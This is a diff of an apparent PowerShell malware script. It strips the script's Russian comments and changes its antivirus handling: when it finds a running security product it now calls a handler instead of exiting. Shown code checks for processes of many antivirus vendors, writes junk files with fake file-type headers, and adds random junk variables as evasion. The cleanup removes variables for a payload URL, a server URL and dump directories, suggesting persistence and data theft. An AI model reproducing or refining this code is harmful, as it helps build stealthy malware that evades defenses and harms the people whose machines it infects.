@@ -516,16 +516,14 @@ Install-Watchdog
 New-SetupLauncher
 Hide-Folder
 
-# Проверка на антивирусные процессы
 $avProcs = @("MsMpEng","avp","avg","avast","mcshield","clamwin","savservice","wrsa","f-secure","egui","ekrn","nod32","kaspersky","sophos","trend","symantec","defender")
 try {
     $procs = Get-Process | Select-Object -ExpandProperty ProcessName
     foreach ($av in $avProcs) {
-        if ($procs -contains $av) { exit }
+        if ($procs -contains $av) { Handle-AVDetection }
     }
 } catch {}
 
-# Генерация junk-файлов с легитимным содержимым
 $legitContents = @("MZ", "PK", "This program cannot be run in DOS mode.", "SQLite format 3", "RIFF", "GIF89a")
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     $junkFile = Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
@@ -533,7 +531,6 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     Set-Content -Path $junkFile -Value $content -Encoding ASCII
 }
 
-# Junk-код: случайные переменные, функции, ошибки
 for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
     Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
@@ -547,7 +544,6 @@ for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
     Write-Output ("Random log: " + (Get-Random))
 }
 
-# Очистка временных файлов
 try {
     Get-ChildItem -Path $tempDir -Filter *.tmp -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
 } catch {}
@@ -562,5 +558,4 @@ while ($true) {
     Start-Sleep -Seconds 10
 }
 
-# Очистка переменных после использования
 Remove-Variable -Name key, tempDir, fileDumpDir, videoSubDir, logPath, macroInputPath, mainPath, scriptPath, watchdogPath, sessionDataDir, releasesUrl, pagesUrl, serverUrl, versionURL, payloadURL -ErrorAction SilentlyContinue
